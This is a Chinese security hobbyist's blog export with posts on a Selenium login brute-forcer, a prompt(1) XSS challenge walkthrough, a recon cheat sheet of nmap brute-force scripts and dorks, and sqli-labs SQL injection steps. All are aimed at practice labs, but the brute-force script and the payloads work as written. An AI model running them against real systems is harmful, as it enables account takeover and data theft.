{"meta":{"title":"Blad's Blog","subtitle":"一名白帽子的成长之路","description":"菜鸡白帽,SRC无名氏<br>励志成为安全大牛，现在刚迈出第一步","author":"Blad","url":"http://yoursite.com","root":"/"},"pages":[{"title":"tags","date":"2019-06-20T14:14:40.000Z","updated":"2019-06-20T14:15:00.737Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"文章分类","date":"2019-06-20T13:34:25.000Z","updated":"2019-06-20T13:35:25.443Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"selenium自动化爆破","slug":"selenium自动化爆破","date":"2019-07-16T16:05:48.000Z","updated":"2019-07-16T16:10:35.790Z","comments":true,"path":"2019/07/17/selenium自动化爆破/","link":"","permalink":"http://yoursite.com/2019/07/17/selenium自动化爆破/","excerpt":"selenium自动化爆破工具某一天测试公司某个业务的时候发现，虽然页面没有验证码，但是抓包之后一直有个sign值，而且每次的会话这个值都会变，改了之后后端会报错提示 sign值不合法。 我这暴脾气，立马看源码就准备逆了它，看着就来气。调了半天，woc全tm混淆的，代码读的我眼睛疼。算了，此处不留爷，自有留爷处，从界面下手，直接自动化爆破算了。 虽然网上已经有很多同类的东西了，但自己造轮子才能提高啊，就着手写了。 基础知识+环境配置我是mac的环境，使用python2.7+chromedriver实现首先使用homebrew安装chromedriverbrew cask install chromedriverpip install selenium 至此，环境准备结束，该补充selenium的知识了。 官方手册送上：https://selenium-python.readthedocs.io/核心知识：1.elementLocation2.webdriver","text":"selenium自动化爆破工具某一天测试公司某个业务的时候发现，虽然页面没有验证码，但是抓包之后一直有个sign值，而且每次的会话这个值都会变，改了之后后端会报错提示 sign值不合法。 我这暴脾气，立马看源码就准备逆了它，看着就来气。调了半天，woc全tm混淆的，代码读的我眼睛疼。算了，此处不留爷，自有留爷处，从界面下手，直接自动化爆破算了。 虽然网上已经有很多同类的东西了，但自己造轮子才能提高啊，就着手写了。 基础知识+环境配置我是mac的环境，使用python2.7+chromedriver实现首先使用homebrew安装chromedriverbrew cask install chromedriverpip install selenium 至此，环境准备结束，该补充selenium的知识了。 官方手册送上：https://selenium-python.readthedocs.io/核心知识：1.elementLocation2.webdriver 本次的工具主要使用到了元素定位和部分webdriver的功能 过程本次用webug4.0靶场的登录做例子，其他都一样。 定位1234567891011121314151617find_element_by_idfind_element_by_namefind_element_by_xpathfind_element_by_link_textfind_element_by_partial_link_textfind_element_by_tag_namefind_element_by_class_namefind_element_by_css_selector下面是查找多个元素（这些方法将返回一个列表）：find_elements_by_namefind_elements_by_xpathfind_elements_by_link_textfind_elements_by_partial_link_textfind_elements_by_tag_namefind_elements_by_class_namefind_elements_by_css_selector username框直接根据name获取定位password用id或者class定位 123username = driver.find_element_by_name(&quot;username&quot;)password = driver.find_element_by_id(&quot;doc-ipt-pwd-1&quot;)login_button = driver.find_element_by_class_name(&quot;am-btn&quot;) 判断跳转我的逻辑是判断当前的url和我爆破的url是否是同一个，不是的话说明账号密码正确driver.current_url获取当前URL 效果速度挺快的，胜在少了逆sign等操作，后续加入bypass极验功能 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#coding:utf-8from selenium import webdriverimport timeimport sysimport osurl = &quot;http://172.16.173.159/control/login.php&quot;sample_user = [&apos;admin&apos;,&apos;admin123&apos;,&apos;root&apos;,&apos;administrator&apos;,&apos;guest&apos;,&apos;Admin&apos;]sample_pass = [&apos;admin123&apos;,&apos;123456&apos;,&apos;a123456&apos;,&apos;1234abcd&apos;,&apos;Qwer1234&apos;,&apos;admin&apos;]driver = webdriver.Chrome()driver.get(url)# driver.find_element_by_css_selector(&quot;.js_show_pwd_panel&quot;).click()# def Buster():# fopen(&quot;&quot;)def getElement(): status = False try: # username = driver.find_element_by_name(&quot;loginUserName&quot;) # password = driver.find_element_by_name(&quot;loginPassword&quot;) username = driver.find_element_by_name(&quot;username&quot;) password = driver.find_element_by_id(&quot;doc-ipt-pwd-1&quot;) # login_button = driver.find_element_by_id(&quot;sublogin&quot;) login_button = driver.find_element_by_class_name(&quot;am-btn&quot;) status = True except Exception as e: raise e return status,username,password,login_buttondef normal_test(sample_user,sample_pass): for i in sample_user: for j in sample_pass: status,username,password,login_button = getElement() if status: username.clear() username.send_keys(i) # time.sleep(2) password.clear() password.send_keys(j) # print &quot;success &quot; + str(i) login_button.click() if driver.current_url != url: print &apos;\\033[32m[*]Username/Passwprd : %s/%s success&apos; % (i,j) else: print &apos;\\033[32m[*]Username/Passwprd : %s/%s fail&apos; % (i,j) print &quot;\\033[0;37;40m\\tHello World\\033[0m&quot; else: print &quot;get element error~&quot; time.sleep(0.5)def dict_test(users,passwds): total = len(users)*len(passwds) current = 1 page_status = False for user in users: for passwd in passwds: status,username,password,login_button = getElement() if status: username.clear() username.send_keys(user.strip()) # time.sleep(2) password.clear() password.send_keys(passwd.strip()) # print &quot;success &quot; + str(i) login_button.click() if driver.current_url != url: page_status = True print &quot;\\033[31m[*]&quot;+&quot;Username/Passwprd [%s/%s]: %s/%s success&quot; % (current,total,user.strip(),passwd.strip()) else: print &quot;\\033[32m[*]&quot;+&quot;Username/Passwprd [%s/%s]: %s/%s fail&quot; % (current,total,user.strip(),passwd.strip()) else: print &quot;get element error~&quot; current = current+1 # time.sleep(0.5) def main(): # normal_test(sample_user,sample_pass) if len(sys.argv) !=3: print &quot;\\t Usage: python rpoBuster.py &lt;userlist&gt; &lt;passwordlist&gt;\\n&quot; sys.exit(1) try: users = open(sys.argv[1], &quot;r&quot;).readlines() except(IOError): print &quot;[-] Error: Check your userlist path\\n&quot; sys.exit(1) try: passwds = open(sys.argv[2], &quot;r&quot;).readlines() except(IOError): print &quot;[-] Error: Check your passwordlist path\\n&quot; sys.exit(1) # print len(users)*len(passwds) # for i in users: # print i.strip() dict_test(users,passwds)if __name__ == &apos;__main__&apos;: main()","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"自动化工具","slug":"自动化工具","permalink":"http://yoursite.com/tags/自动化工具/"},{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"prompt(1) to win","slug":"prompt-1-to-win","date":"2019-07-09T16:36:31.000Z","updated":"2019-07-09T16:44:50.681Z","comments":true,"path":"2019/07/10/prompt-1-to-win/","link":"","permalink":"http://yoursite.com/2019/07/10/prompt-1-to-win/","excerpt":"prompt(1) to win 通关笔记网址：http://prompt.ml基于alert(1)做的xss闯关游戏 level 012345function escape(input) &#123; // warm up // script should be executed without user interaction return &apos;&lt;input type=&quot;text&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos;;&#125; 代码是input标签的xss，没有过滤，直接闭合双引号插入常规paylaod即可 1a&quot;&gt;&lt;img src=x onerror=prompt(1)&gt;//","text":"prompt(1) to win 通关笔记网址：http://prompt.ml基于alert(1)做的xss闯关游戏 level 012345function escape(input) &#123; // warm up // script should be executed without user interaction return &apos;&lt;input type=&quot;text&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos;;&#125; 代码是input标签的xss，没有过滤，直接闭合双引号插入常规paylaod即可 1a&quot;&gt;&lt;img src=x onerror=prompt(1)&gt;// level 112345678function escape(input) &#123; // tags stripping mechanism from ExtJS library // Ext.util.Format.stripTags var stripTagsRE = /&lt;\\/?[^&gt;]+&gt;/gi; input = input.replace(stripTagsRE, &apos;&apos;); return &apos;&lt;article&gt;&apos; + input + &apos;&lt;/article&gt;&apos;;&#125; 查看代码，发现是被正则过滤，只要有尖括号，且尖括号里有内容或有&lt;/&gt; 均替换为空以下均会过滤： 1234&lt;h1&gt;&lt;script&gt;&lt;sss&gt;&lt;/&gt; 经过测试，发现只要有&gt;就会被过滤，且此处input内容被包裹在&lt;article&gt;标签中，如果要解析，必须要插入标签才能执行。 那么这里&lt;script&gt;肯定用不了了，只能插入单标签 考虑到了js的自动补全特性（但实际上是开发者做的防止页面混乱的补全措施）只输入一半，用单行注释注释掉后面的双引号，即可成功(经过测试，多行注释也行，只要注释掉就行) 12345#onload事件会在页面或图像加载完成后立即发生&lt;img src=x onload=alert(1)//&lt;img src=x onerror=alert(1)//&lt;img src=x onerror=alert(1)&lt;!--&lt;img src=x onerror=&quot;alert(1)&quot; level 21234567function escape(input) &#123; // v-- frowny face input = input.replace(/[=(]/g, &apos;&apos;); // ok seriously, disallows equal signs and open parenthesis return input;&#125; 此题涉及到了浏览器渲染顺序https://segmentfault.com/q/1010000002393260 先写一下我的理解1.浏览器只负责url编码，url解码永远在服务器端。因为浏览器对于url永远是发起者，服务器是接受者，只需要服务器理解即可，所以url解码永远发生在服务器端。PS：仅有在javascript:alert(1)这种情况下，点击后浏览器作为本地的服务器进行url解码，用于理解url内容。2.浏览器先进行HTML解码，再进行js解码。 再来说这道题，因为是dom动态正则的input内容，所以使用html编码可以绕过正则检查，而在浏览器渲染dom树时，先解析了html的&lt;svg&gt; 和&amp;#40;，而后才解析了js，所以可以执行成功。跟踪结果：设置断点运行，发现到escape函数时，html编码的(没有解析：将代码写入sandbox（prompt(1)游戏是在sandbox里展示效果的，所以会有一次写入sandbox paylaod的操作）：将input的内容写入dom执行真正的解析操作（可参考浏览器解析流程）：然后浏览器解析svg标签为xml 代码中过滤了=和( 破坏了常规的paylaod，所以payload如下： 12html编码绕过正则匹配&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt; level 31234567function escape(input) &#123; // filter potential comment end delimiters input = input.replace(/-&gt;/g, &apos;_&apos;); // comment the input to avoid script execution return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos;;&#125; 使用–!&gt;闭合注释即可 1--!&gt;&lt;script&gt;prompt(1)&lt;/script&gt; level 41234567891011function escape(input) &#123; // make sure the script belongs to own site // sample script: http://prompt.ml/js/test.js if (/^(?:https?:)?\\/\\/prompt\\.ml\\//i.test(decodeURIComponent(input))) &#123; var script = document.createElement(&apos;script&apos;); script.src = input; return script.outerHTML; &#125; else &#123; return &apos;Invalid resource.&apos;; &#125;&#125; 根据过滤代码，判断是绕过正则，引入外部js 使用@符号，让浏览器取后面的域名引入js(chrome实现失败，firefox可以成功，chrome引入js提示blocked:origin)本地启动web服务，并在根目录创建xss.js写入如下代码： 12prompt(1)alert(1) 1http://prompt.ml%2f@prompt.ml/js/test.js level 51234567function escape(input) &#123; // apply strict filter rules of level 0 // filter &quot;&gt;&quot; and event handlers input = input.replace(/&gt;|on.+?=|focus/gi, &apos;_&apos;); return &apos;&lt;input value=&quot;&apos; + input + &apos;&quot; type=&quot;text&quot;&gt;&apos;;&#125; 分析代码，过滤了&gt; on事件 focus方法 &#39;onclick=&#39;这一类但是是input标签，所以可以改变type属性，变成图片，然后利用换行绕过=号匹配，即可成功插入 12&quot; type=&quot;image&quot; src=x onerror=&quot;prompt(1) level 61234567891011121314151617181920212223242526272829303132function escape(input) &#123; // let&apos;s do a post redirection try &#123; // pass in formURL#formDataJSON // e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125; var segments = input.split(&apos;#&apos;); var formURL = segments[0]; var formData = JSON.parse(segments[1]); var form = document.createElement(&apos;form&apos;); form.action = formURL; form.method = &apos;post&apos;; for (var i in formData) &#123; var input = form.appendChild(document.createElement(&apos;input&apos;)); input.name = i; input.setAttribute(&apos;value&apos;, formData[i]); &#125; return form.outerHTML + &apos; \\n\\&lt;script&gt; \\n\\ // forbid javascript: or vbscript: and data: stuff \\n\\ if (!/script:|data:/i.test(document.forms[0].action)) \\n\\ document.forms[0].submit(); \\n\\ else \\n\\ document.write(&quot;Action forbidden.&quot;) \\n\\&lt;/script&gt; \\n\\ &apos;; &#125; catch (e) &#123; return &apos;Invalid form data.&apos;; &#125;&#125; 根据代码，发现是url#post的格式提交表单。并且action过滤了script、data等伪协议。所以尝试使用 javascript:alert(1)但是被过滤了，之后了解到了。form表单后面的action会覆盖前面的，所以此处可以构造如下payload: 12javascript:alert(1)#&#123;&quot;action&quot;:&quot;123&quot;&#125;javascript:prompt(1)#&#123;&quot;action&quot;:&quot;123&quot;&#125; level 712345678function escape(input) &#123; // pass in something like dog#cat#bird#mouse... var segments = input.split(&apos;#&apos;); return segments.map(function(title) &#123; // title can only contain 12 characters return &apos;&lt;p class=&quot;comment&quot; title=&quot;&apos; + title.slice(0, 12) + &apos;&quot;&gt;&lt;/p&gt;&apos;; &#125;).join(&apos;\\n&apos;);&#125; 代码限制了paylaod长度为12，所以需要注释绕过，经过测试需要使用/**/ js的注释有2中 1234// 单行注释/**/多行注释HTML 注释&lt;!-- --&gt;不要搞混 payload： 1&quot;&gt;&lt;script&gt;/*#*/prompt(/*#*/1)/*#*/&lt;/script&gt; level 8 这题我也没搞明白12345678910function escape(input) &#123; // prevent input from getting out of comment // strip off line-breaks and stuff input = input.replace(/[\\r\\n&lt;/&quot;]/g, &apos;&apos;); return &apos; \\n\\&lt;script&gt; \\n\\ // console.log(&quot;&apos; + input + &apos;&quot;); \\n\\&lt;/script&gt; &apos;;&#125; 思路是，根据编码绕过正则，续利用浏览器特性：使用unicode绕过,chrome有效，火狐无效 12浏览器console输入以下字符可获得paylaod&apos;\\u2028alert(1)\\u2028--&gt;&apos; chrome下： 1 alert(1) --&gt; IE下 level 9123456789function escape(input) &#123; // filter potential start-tags input = input.replace(/&lt;([a-zA-Z])/g, &apos;&lt;_$1&apos;); // use all-caps for heading input = input.toUpperCase(); // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS! return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos;;&#125; 又是一个神奇的题目，编码绕过。这次是拉丁字母绕过正则匹配:https://unicode-table.com/cn/017F/ſ是拉丁字母的s，可以绕过正则被解析。 paylaod： 1&lt;ſcript ſrc=http://localhost/xss.js&gt;&lt;/ſcript&gt; level 10123456789function escape(input) &#123; // (╯°□°）╯︵ ┻━┻ input = encodeURIComponent(input).replace(/prompt/g, &apos;alert&apos;); // ┬──┬ ノ( ゜-゜ノ) chill out bro input = input.replace(/&apos;/g, &apos;&apos;); // (╯°□°）╯︵ /(.□. \\）DONT FLIP ME BRO return &apos;&lt;script&gt;&apos; + input + &apos;&lt;/script&gt; &apos;;&#125; 过滤单引号为空，prompt替换为alert直接payload：prom&#39;pt(1) level 11123456789101112131415function escape(input) &#123; // name should not contain special characters var memberName = input.replace(/[[|\\s+*/\\\\&lt;&gt;&amp;^:;=~!%-]/g, &apos;&apos;); // data to be parsed as JSON var dataString = &apos;&#123;&quot;action&quot;:&quot;login&quot;,&quot;message&quot;:&quot;Welcome back, &apos; + memberName + &apos;.&quot;&#125;&apos;; // directly &quot;parse&quot; data in script context return &apos; \\n\\&lt;script&gt; \\n\\ var data = &apos; + dataString + &apos;; \\n\\ if (data.action === &quot;login&quot;) \\n\\ document.write(data.message) \\n\\&lt;/script&gt; &apos;;&#125; js特性，后面的变量会覆盖前面的发现如果名字相同，一定会输出后面，这也就是需要构造&quot;message&quot;:prompt(1)可是原先有引号，想闭合，发现正则表达式几乎全部过滤，所以只能另想办法这里的技巧是利用字母操作符来绕过限制，例如in instanceof等等，在这里这两个可以执行成功，payload为&quot;(prompt(1))instanceof&quot;或者&quot;(prompt(1))in&quot; level 12123456789function escape(input) &#123; // in Soviet Russia... input = encodeURIComponent(input).replace(/&apos;/g, &apos;&apos;); // table flips you! input = input.replace(/prompt/g, &apos;alert&apos;); // ノ┬─┬ノ ︵ ( \\o°o)\\ return &apos;&lt;script&gt;&apos; + input + &apos;&lt;/script&gt; &apos;;&#125; 和第十题很像，但是顺序变了一下，可以用eval函数来执行js，eval((630038579).toString(30))(1)因为单引号被过滤，尝试atob解码base64没成功还有很多方法，参考链接https://blog.csdn.net/Ni9htMar3/article/details/77938899 level 13123456789101112131415161718192021222324252627282930313233 function escape(input) &#123; // extend method from Underscore library // _.extend(destination, *sources) function extend(obj) &#123; var source, prop; for (var i = 1, length = arguments.length; i &lt; length; i++) &#123; source = arguments[i]; for (prop in source) &#123; obj[prop] = source[prop]; &#125; &#125; return obj; &#125; // a simple picture plugin try &#123; // pass in something like &#123;&quot;source&quot;:&quot;http://sandbox.prompt.ml/PROMPT.JPG&quot;&#125; var data = JSON.parse(input); var config = extend(&#123; // default image source source: &apos;http://placehold.it/350x150&apos; &#125;, JSON.parse(input)); // forbit invalid image source if (/[^\\w:\\/.]/.test(config.source)) &#123; delete config.source; &#125; // purify the source by stripping off &quot; var source = config.source.replace(/&quot;/g, &apos;&apos;); // insert the content using mustache-ish template return &apos;&lt;img src=&quot;&#123;&#123;source&#125;&#125;&quot;&gt;&apos;.replace(&apos;&#123;&#123;source&#125;&#125;&apos;, source); &#125; catch (e) &#123; return &apos;Invalid image data.&apos;; &#125;&#125; 大致看了一遍代码，逻辑应该是如下(偷看答案)：输入json，进入JSON.parse解析，不是json抛出异常、是json取其中的source的值，然后进入extend()把默认的属性替换为输入的，然后是正则判断source对应的值中是否有不属于url的符号，有则删去这个值，将source属性删除。每个对象都会在其内部初始化一个属性，就是proto，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去proto里面找这个属性。 那么基本上就是构造{&quot;source&quot;:&quot;&#39;&quot;,&quot;__proto__&quot;:{&quot;source&quot;:&quot;onerror=prompt(1)&quot;}},由于前面有非法字符’，则会删除，但是在替换的时候由于过滤了”,无法闭合，那么正好有一种特殊的替换方式 Pattern Inserts $$ 匹配处删除并插入带$的字符串 $’ 在匹配到字符后删除，并在字符结束后面增加内融容 $` 匹配到之后将整串插入，删除匹配到的内容 $&amp; 匹配到之后插入内容 $n Where n is a positive integer less than 100, inserts the nth parenthesized submatch string, provided the first argument was a RegExp object. Note that this is 1-indexed. 具体如下图: 所以payload如下: 1&#123;&quot;source&quot;:&quot;&apos;&quot;,&quot;__proto__&quot;:&#123;&quot;source&quot;:&quot;$`onerror=prompt(1)&gt;&quot;&#125;&#125; level 14(答案不对，思考中)12345678910111213function escape(input) &#123; // I expect this one will have other solutions, so be creative :) // mspaint makes all file names in all-caps :( // too lazy to convert them back in lower case // sample input: prompt.jpg =&gt; PROMPT.JPG input = input.toUpperCase(); // only allows images loaded from own host or data URI scheme input = input.replace(/\\/\\/|\\w+:/g, &apos;data:&apos;); // miscellaneous filtering input = input.replace(/[\\\\&amp;+%\\s]|vbs/gi, &apos;_&apos;); return &apos;&lt;img src=&quot;&apos; + input + &apos;&quot;&gt;&apos;;&#125; level 151234567891011function escape(input) &#123; // sort of spoiler of level 7 input = input.replace(/\\*/g, &apos;&apos;); // pass in something like dog#cat#bird#mouse... var segments = input.split(&apos;#&apos;); return segments.map(function(title, index) &#123; // title can only contain 15 characters return &apos;&lt;p class=&quot;comment&quot; title=&quot;&apos; + title.slice(0, 15) + &apos;&quot; data-comment=\\&apos;&#123;&quot;id&quot;:&apos; + index + &apos;&#125;\\&apos;&gt;&lt;/p&gt;&apos;; &#125;).join(&apos;\\n&apos;);&#125; 和level 7 一样，用html注释即可，payload如下： 1&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;","categories":[{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/categories/XSS/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"},{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/tags/XSS/"}]},{"title":"信息收集web","slug":"信息收集web","date":"2019-06-24T09:59:54.000Z","updated":"2019-06-30T15:30:01.874Z","comments":true,"path":"2019/06/24/信息收集web/","link":"","permalink":"http://yoursite.com/2019/06/24/信息收集web/","excerpt":"信息收集(Web篇)0x00 子域名收集工具1、子域名挖掘机、lijiejieSubDomain 需要自己维护一套字典才能有很好的效果，你字典越全爆破效果越好。 2、在线子域名收集 https://d.chinacycc.com/ http://z.zcjun.com/ (字典已搞到) https://phpinfo.me/domain/ 3.test404轻量title获取器 4.SSL证书获取子域名","text":"信息收集(Web篇)0x00 子域名收集工具1、子域名挖掘机、lijiejieSubDomain 需要自己维护一套字典才能有很好的效果，你字典越全爆破效果越好。 2、在线子域名收集 https://d.chinacycc.com/ http://z.zcjun.com/ (字典已搞到) https://phpinfo.me/domain/ 3.test404轻量title获取器 4.SSL证书获取子域名 5.获取到域名时，很多是内网域名，但是通过分析其泛解析的ip段还有孤立ip，绑定hosts访问，往往有意想不到的收获，团队某表哥的骚思路。 0x01 IP收集/端口收集1、子域名挖掘机layer收集IP 2、其他获取子域名的工具，然后提取IP 3、使用Nmap、Zmap、Masscan进行端口扫描 通过上面的几种方式获取到IP之后，可以把IP提取出来，然后利用Nmap的-iL参数批量扫描 使用Nmap进行可爆破服务扫描 1nmap 目标 --script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute 使用Nmap对常见的漏洞扫描并判断 1nmap 目标 --script=auth,vuln Nmap精确判断漏洞并扫描端口 1nmap 目标 --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version 0x02 C段信息收集1、在线c端查询 支持旁站查询等 https://phpinfo.me/bing.php 0x03 搜索语法收集敏感、泄露文件1、搜索引擎语法搜索文件 搜索引擎：baidu.com、bing.com、google.com Site:xxx.com filetype:pdf Site:xxx.com inurl:xxxx 收集一些敏感的文件，类似使用手册、帮助文档。里面可能会有一些路径，偶尔就有未授权访问。特别是帮助文档，有时候目录不会做访问限制，能看到很多东西。 2、查找后台 1site:xxx.xxx adminsite:xxx.xxx login site:xxx.xxx systemsite:xxx.xxx 管理site:xxx.xxx 登录 site:xxx.xxx 内部site:xxx.xxx 系统site:xxx.xxx admin site:xxx.xxx login site:xxx.xxx inner site:xxx.xxx 后台 3、查找指纹、网上已曝光的漏洞指纹 1site:xxxx.com inurl:console 4、查找技巧 某些站测试越权的时候，可能越权参数比较难构造，可以搜一下 http://xxx.xxx.xxx/userinfo/?uid=55498ad290h0sadalksaf 1site:xxx.xxx inurl:uid=5549 0x04 云盘搜索工具1、盘搜搜http://www.pansoso.com/ 2、凌风云https://user.lingfengyun.com 3、盘搜http://www.pansou.com/ …… 0x05 github等托管平台信息收集1、有时间自己搞个github监控 2、sourcegraph是非常专业的代码搜索服务商，他们提供的Sourcegraph Server是免费的代码搜索服务器，通过docker的方式部署，支持无限扩展，支持对GitHub, BitBucket, GitLab等仓库的代码搜索。搜索内容包括仓库代码、diff、commit。 0x06 目录收集1、7kbStorm大佬的目录爆破工具 https://github.com/7kbstorm/7kbscan-WebPathBrute 核心还是自己的字典牛不牛逼。 其实403循环爆破可以爆破到很多未授权访问。 有直接的服务器返回的默认404页面说明能爆破。要是有302跳转的就很难了。 0x07 svn .git 信息泄露1、Githack等扫描工具 2、svn泄露利用工具 0x08 敏感目录泄露1、备份文件泄露常用默认名字： 12345[www.zip](http://www.zip)[www.tar.gz](http://www.tar.gz)[www.rar](http://www.rar) web.zipweb.rar... 2、WEB-INF/web.xml泄露 WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问： 123456/WEB-INF/config/jdbc.properties/WEB-INF/web.xml/WEB-INF/classes//WEB-INF/lib//WEB-INF/src//WEB-INF/database.propertiesbzr泄露 通过它我们可以看项目历史：http://xxx.xxx.xxx/.bzr/ 3、spring框架信息泄露 一下目录均是默认开启的 1[&quot;autoconfig&quot;,&quot;configprops&quot;,&quot;beans&quot;,&quot;dump&quot;,&quot;env&quot;,&quot;health&quot;,&quot;info&quot;,&quot;mappings&quot;,&quot;metrics&quot;,&quot;trace&quot;] 有的框架还会开启心跳检查(应用监控)，访问http://xxx.com/actuator即可 详情学习这篇：https://xz.aliyun.com/t/2233 0x09 shodan、fofa收集信息0x10 其他方式1、关注每个业务的公众号，新业务都会在公众号发消息 2、招聘广告，如果某个业务线招人，说明要开始重点发展了 3、多申请非普通用户的账号，可以获得更多信息。如：业务架构、不同业务直接的联系等。 0x11 相关链接1.浅谈信息收集 https://www.t00ls.net/thread-51445-1-1.html https://www.freebuf.com/articles/web/117006.html https://mp.weixin.qq.com/s/pprqACosIunwtN-u7qd6rg","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"},{"name":"信息安全","slug":"信息安全","permalink":"http://yoursite.com/tags/信息安全/"}]},{"title":"sqli-labs_less_1","slug":"sqli-labs-less-1","date":"2019-06-20T14:27:20.000Z","updated":"2019-06-20T14:41:57.263Z","comments":true,"path":"2019/06/20/sqli-labs-less-1/","link":"","permalink":"http://yoursite.com/2019/06/20/sqli-labs-less-1/","excerpt":"方法一：报错注入extractvalue()判断注入点：输入单引号，发现页面报错 http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; 闭合前一个单引号，注释掉后一个，并加入判断payloadhttp://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=1--+ 所以利用extractvalue()报错注入先判断函数是否可执行http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,md5(123));--+","text":"方法一：报错注入extractvalue()判断注入点：输入单引号，发现页面报错 http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; 闭合前一个单引号，注释掉后一个，并加入判断payloadhttp://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=1--+ 所以利用extractvalue()报错注入先判断函数是否可执行http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,md5(123));--+ 获取version()、database()、user()等信息http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,database()));--+ 获取表名：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)));--+ 获取users的列名http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1)));--+ 获取每列（id、username、password）的内容http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select username from security.users limit 0,1)));--+ 方法二：联合注入判断注入点：输入单引号，发现页面报错 http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; order by 判断有几列http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; order by 3--+union select 联合注入http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,22,33--+ 判断数据库名称：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,database(),33--+ 获取security的表名：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),33--+ 获取列名：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1)),33--+ 获取每列（id、username、password）的内容：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,concat(0x7e,(select username from security.users limit 1,1)),33--+ 方法3：回显布尔注入(ascii逐位判断)判断注入点：输入单引号，发现页面报错 http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=1--+获取数据库名：利用ascii逐位判断，更改substr()第二参数1~nhttp://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr(database(),1,1))=115--+获取表名(emails\\referers\\uagents\\users)：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101--+获取users列名：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=105--+获取每列（id、username、password）的内容http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr((select username from security.users limit 0,1),1,1))&gt;65--+ 方法4：时间盲注(sleep()、if())if（（条件），m，n）语句：若条件为真 返回m，若条件为假 返回n；获取数据库名：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and sleep(if((ascii(substr(database(),1,1))=115),5,0))--+","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"http://yoursite.com/categories/sqli-labs/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/tags/SQL注入/"}]}]}